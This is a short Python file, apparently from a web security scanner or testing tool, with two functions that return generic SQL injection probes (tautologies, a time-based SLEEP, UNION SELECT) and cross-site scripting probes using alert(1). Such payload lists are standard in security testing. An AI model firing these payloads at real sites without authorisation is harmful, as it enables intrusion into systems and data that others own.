def generate_sqli_payloads():

    return [
        "'",
        "' OR 1=1--",
        "' OR '1'='1",
        "' AND SLEEP(5)--",
        "' UNION SELECT NULL--"
    ]


def generate_xss_payloads():

    return [
        "<script>alert(1)</script>",
        "\"><script>alert(1)</script>",
        "'><svg/onload=alert(1)>",
        "<img src=x onerror=alert(1)>"
    ]
